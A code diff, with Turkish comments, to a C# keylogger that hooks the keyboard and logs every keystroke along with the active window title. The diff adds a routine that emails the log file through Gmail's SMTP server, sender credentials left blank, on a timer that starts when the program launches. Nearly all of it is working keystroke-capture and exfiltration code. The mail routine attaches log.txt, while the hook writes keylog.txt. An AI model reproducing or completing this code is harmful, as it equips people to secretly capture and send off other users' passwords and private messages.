@@ -5,9 +5,52 @@ namespace KeyloggerForm
     using System.Runtime.InteropServices;
     using System.Text;
     using System.Windows.Forms;
+    using System.Net;
+    using System.Net.Mail;
 
     public partial class Form1 : Form
     {
+        private void MailGonder()
+        {
+            try
+            {
+                //Gonderici bilgileri
+                string gonderici = ""; //gönderici mail
+                string sifre = ""; // gonderici gmail uygulama þifresi
+                string alici = ""; //alýcý mail
+
+                MailMessage mail = new MailMessage();
+                mail.From = new MailAddress(gonderici);
+                mail.To.Add(alici);
+                mail.Subject = "Log Dosyasý";
+                mail.Body = "Merhaba, log dosyan ekte.";
+
+                string logDosyasi = Path.Combine(Application.StartupPath, "log.txt");
+                if (File.Exists(logDosyasi))
+                {
+                    mail.Attachments.Add(new Attachment(logDosyasi));
+                }
+
+                using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
+                {
+                    smtp.Credentials = new NetworkCredential(gonderici, sifre);
+                    smtp.EnableSsl = true;
+                    smtp.Send(mail);
+                }
+
+                File.AppendAllText("mail_status.txt", DateTime.Now + " - Mail gönderildi.\n");
+            }
+            catch(Exception ex)
+            {
+                File.AppendAllText("error.txt", DateTime.Now + " - Hata: " + ex.Message + "\n");
+
+
+            }
+        }
+       
+
+
+
         private static string logPath = Path.Combine(
         AppDomain.CurrentDomain.BaseDirectory, "keylog.txt"
     );
@@ -61,7 +104,7 @@ namespace KeyloggerForm
         private static LowLevelKeyboardProc proc = HookCallback;
 
         private static IntPtr hookID = IntPtr.Zero;
-        
+
         protected override void OnFormClosed(FormClosedEventArgs e)
         {
             UnhookWindowsHookEx(hookID);
@@ -145,8 +188,8 @@ namespace KeyloggerForm
                 {
                     case Keys.Enter:
                         // Satýrý dosyaya yaz ve tarih–saat ekle
-                        
-                        File.AppendAllText(logPath,  Environment.NewLine);
+
+                        File.AppendAllText(logPath, Environment.NewLine);
                         string windowTitle = GetActiveWindowTitle();
                         File.AppendAllText(logPath, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] ({windowTitle}) ");
                         currentLine.Clear();
@@ -286,17 +329,36 @@ namespace KeyloggerForm
             trayMenu.Items.Add("Log dosyasýný aç", null, OnOpenLog);
             trayMenu.Items.Add("Log'u temizle", null, OnClearLog);
             trayMenu.Items.Add("Çýkýþ", null, OnExit);
-            
-            
+
+
 
             //notifyIcon oluþtur
             trayIcon = new NotifyIcon();
             trayIcon.Text = "Keylogger Aktif";
             trayIcon.Icon = SystemIcons.Application;
-            trayIcon. ContextMenuStrip = trayMenu; //baðlama burada!
+            trayIcon.ContextMenuStrip = trayMenu; //baðlama burada!
             trayIcon.Visible = true;
 
+            // Uygulama açýlýþýnda timer çalýþsýn
+            timerMail.Start();
 
+
+
+        }
+
+        private void timerMail_Tick(object sender, EventArgs e)
+        {
+            // Çakýþmayý önlemek için timer’ý durdurup iþlem bitince yeniden baþlatacaðýz
+    timerMail.Stop();
+            try
+            {
+                MailGonder();
+            }
+            finally
+            {
+                // Ýþlem bittiðinde yeniden baþlat
+                timerMail.Start();
+            }
 
         }
     }
